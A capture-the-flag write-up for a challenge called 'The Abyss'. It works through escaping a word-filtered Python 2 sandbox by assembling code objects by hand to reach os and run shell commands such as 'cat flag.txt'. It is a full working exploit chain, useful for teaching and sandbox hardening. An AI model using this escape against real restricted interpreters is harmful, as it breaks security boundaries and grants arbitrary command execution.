### The Abyss
*Written by nthistle*
#### Problem Statement

If you stare into the abyss, the abyss stares back.

`nc problem1.tjctf.org 8006`

#### Observations

The first observation is that this is a Python environment. 

However, further experimentation reveals that all our errors are eaten up with a cute message.
```
>>> blahblop
The Abyss consumed your error.
```

Furthermore, some words seem to be banned. 
```
>>> ().__class__
Sorry, '__class__' is not allowed.
>>> lol__class__lol
Sorry, '__class__' is not allowed.
>>> __clas__
Sorry, '__' is not allowed.
```

It seems there is a word filter. We can't have certain strings in our code. In particular, "\_\_" is banned.

We would like to use solution #4 from [here](https://github.com/lucyoa/ctf-wiki/tree/master/pwn/python-sandbox). 
```
classes = {}.__class__.__base__.__subclasses__()
b = classes[49]()._module.__builtins__
m = b['__import__']('os')
m.system("test")
```

Unfortunately, we can't type out "\_\_class__". "exec" and "eval" are also banned. 

#### Solution
Googling for "CTF Python Jailbreak", we eventually come accross this [article](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/).

>Enter code objects. Python functions are actually objects which are made of a code object and a capture of their global variables. A code object contains the bytecode of that function, as well as the constant objects it refers to, some strings and names, and other metadata (number of arguments, number of locals, stack size, mapping from bytecode to line number). You can get the code object of a function using myfunc.func_code. This is forbidden in the restricted mode of the Python interpreter, so we can’t see the code of the auth function. However, we can craft our own functions like we crafted our own types!

```
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,),
                (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
# Outputs 42
```

This lets us bypass the word filter!

In particular, "ctype" lets us assemble arbitary functions. 

This [answer](https://stackoverflow.com/a/6613169/10178580) from StackOverflow gives us the arguments for the function ctype. 

This function prints out the arguments we need. 
```
#a is a function
def bash(a):
  print(a.func_code.co_argcount)
  print(a.func_code.co_nlocals)
  print(a.func_code.co_stacksize)
  print(a.func_code.co_flags)
  print(repr(a.func_code.co_code))
  print(repr(a.func_code.co_consts))
  print(repr(a.func_code.co_names))
  print(repr(a.func_code.co_varnames))
  print(repr(a.func_code.co_freevars))
  print(repr(a.func_code.co_cellvars))
```

With our function 
```
get_classes():
  return {}.__class__.__base__.__subclasses__()
```
we get 
<pre>
0 
0
1
67
'i\x00\x00j\x00\x00j\x01\x00j\x02\x00\x83\x00\x00S'
(None,)
('__class__', '__base__', '__subclasses__')
()
()
()
</pre>

Plugging these into the previous example, we get
```
get_classes = ftype(ctype(0, 1, 2, 67, 'i\x00\x00j\x00\x00j\x01\x00j\x02\x00\x83\x00\x00S', (None,),("_"+"_class_"+"_","_"+"_base_"+"_","_"+"_subclasses_"+"_"), (), 'stdin', 'f', 1, ''), {})
```

Running this on the interpreter, we see that it works. 

We want `warnings.catch_warnings`, and a little bit of manual searching gives us index 59.
```
warnings = get_classes()[59]()
```

Next, we need to get the property `_module` of warnings. We use the same trick as before. 

```
getModule = ftype(ctype(1, 1, 1, 67, '|\x00\x00j\x00\x00S', (None,),("_"+"module",), ("warnings",), 'stdin', 'f', 1, ''), {})
```

Now,
`module = getModule(warnings)`

<pre>
>>> dir(module)
['WarningMessage', '_OptionError', '__all__', '__builtins__', '__doc__', '__file__', '__name__', '__package__', '_getaction', '_getcategory', '_processoptions', '_setoption', '_show_warning', 'catch_warnings', 'default_action', 'defaultaction', 'filters', 'filterwarnings', 'formatwarning', 'linecache', 'once_registry', 'onceregistry', 'resetwarnings', 'showwarning', 'simplefilter', 'sys', 'types', 'warn', 'warn_explicit', 'warnpy3k']
</pre>

We have access to sys! 

Now we can get access to os.
`os = module.sys.modules["os"]`

Running `os.system("ls")` and then `os.system("cat flag.txt")` finishes the problem.


#### Code
```
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
get_classes = ftype(ctype(0, 1, 2, 67, 'i\x00\x00j\x00\x00j\x01\x00j\x02\x00\x83\x00\x00S', (None,),("_"+"_class_"+"_","_"+"_base_"+"_","_"+"_subclasses_"+"_"), (), 'stdin', 'f', 1, ''), {})
warnings = get_classes()[59]()
getModule = ftype(ctype(1, 1, 1, 67, '|\x00\x00j\x00\x00S', (None,),("_"+"module",), ("warnings",), 'stdin', 'f', 1, ''), {})
module = getModule(warnings)
os = module.sys.modules["os"]
os.system("cat flag.txt")
```